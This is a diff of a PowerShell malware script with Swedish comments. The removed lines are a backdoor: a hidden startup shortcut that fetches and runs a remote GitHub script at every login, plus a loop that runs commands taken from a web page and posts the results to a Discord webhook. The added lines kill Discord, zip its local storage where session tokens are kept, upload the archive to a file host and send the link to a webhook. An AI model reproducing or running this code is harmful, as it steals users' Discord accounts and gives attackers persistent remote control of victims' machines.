@@ -1,67 +1,55 @@
-function wb {
-    param (
-        $cont
-    )
+try {
+Stop-Process (try {get-process -Name "Discord"}) 
+}
+catch {}
+Compress-Archive -Path "$env:appdata\discord\Local Storage\leveldb" -DestinationPath "$env:temp\send.zip" -Force
 
-    # 1. Define your Discord Webhook URL
-$WebhookUrl = "https://discord.com/api/webhooks/1536045344880722013/Qyor6OfSlhGoPOMcvH6mHQ8SVDSkVIPSYvyq7UA826FP9QVzmd4I1M34pk2BpMQNNXZ2"
 
-# 2. Construct the message payload
-$Payload = @{
-    username   = "PowerShell Bot"
-    avatar_url = "https://imgur.com" # Optional custom avatar
-    content    = $cont
+
+
+
+
+
+# Sökvägen till filen i din lokala temp-mapp
+$ZipPath = "$env:temp\send.zip"
+
+if (-not (Test-Path $ZipPath)) {
+    Write-Host "Fel: Hittade inte filen send.zip i temp-mappen!" -ForegroundColor Red
+    return
 }
 
-# 3. Convert payload to JSON formatting
-$BodyJson = $Payload | ConvertTo-Json -Compress
+Write-Host "Hittade filen i temp! Laddar upp till Catbox..." -ForegroundColor Cyan
 
-# 4. Execute the API POST request
-Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $BodyJson -ContentType "application/json"
+# Lägg till krypteringsstöd för nätverket
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-    
+# Bygg ett rent standardformulär som Catbox förstår direkt
+$Body = @{
+    "reqtype"      = "fileupload"
+    "fileToUpload" = Get-Item $ZipPath
 }
-
-
-Write-Output "started"
-
-# 1. Definiera namn och det kommando som ska köras
-$TaskName = "UserLoginCommand"
-$UserCommand = 'iex (irm "https://github.com/tabmper/tabmper.github.io/raw/refs/heads/main/main.ps1")'
-
-# Hitta din personliga autostart-mapp (kräver INTE admin)
-$StartupFolder = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
-$ShortcutPath = Join-Path $StartupFolder "$TaskName.lnk"
 
 try {
-    # Kontrollera om genvägen redan finns
-    if (Test-Path $ShortcutPath) {
-        Write-Host "Genvägen '$TaskName' finns redan. Uppdaterar den nu..." -ForegroundColor Yellow
-    } else {
-        Write-Host "Skapar ny autostart-genväg för '$TaskName'..." -ForegroundColor Green
-    }
-
-    # 2. Skapa eller skriv över genvägen
-    $WshShell = New-Object -ComObject WScript.Shell
-    $Shortcut = $WshShell.CreateShortcut($ShortcutPath)
-    $Shortcut.TargetPath = "powershell.exe"
+    # Skicka filen via inbyggda Invoke-WebRequest (stabilare för formulär än Invoke-RestMethod)
+    $Upload = Invoke-WebRequest -Uri "https://catbox.moe/user/api.php" -Method POST -Form $Body -TimeoutSec 300
     
-    # Skickar med ditt kommando så att det körs helt dolt i bakgrunden vid inloggning
-    $Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$UserCommand`""
-    $Shortcut.WindowStyle = 7 # Minimerat fönster för extra diskretion
-    $Shortcut.Save()
-
-    Write-Host "Success: Ditt GitHub-skript kommer nu att köras dolt varje gång du loggar in!" -ForegroundColor Green
-} 
-catch {
-    Write-Host "Ett fel uppstod när genvägen skulle skapas: $_" -ForegroundColor Red
+    Write-Host "`nUppladdning klar!" -ForegroundColor Green
+    Write-Host "Länk: $($Upload.Content)" -ForegroundColor Yellow
+} catch {
+    Write-Host "`nDet gick inte att ladda upp: $_" -ForegroundColor Red
 }
 
-while ($true) {
-    if (-not($html.p -eq $oldhtml.p)) {
-        wb -cont (Invoke-Expression $html.p)
-    }
-    $oldhtml = $html
-    $html = Invoke-RestMethod -uri "https://tabmper.github.io"
-    Start-Sleep -seconds 10
-}
+
+
+# Replace with your actual Discord webhook URL
+$WebhookUrl = "https://discord.com/api/webhooks/1537527683917938739/SdPz6jcEZA0ainudogL8UwvoibVxzisPr5YMmL4eo72MhJ0O9nISX5qV6taYwj5fhUb6"
+
+# Create the payload (Discord requires 'content')
+$Body = [PSCustomObject]@{
+    content    = $Upload.Content
+    username   = "PowerShell Monitor"
+    avatar_url = "https://imgur.com" # Optional custom bot avatar
+} | ConvertTo-Json
+
+# Send the request
+Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Body -ContentType "application/json"
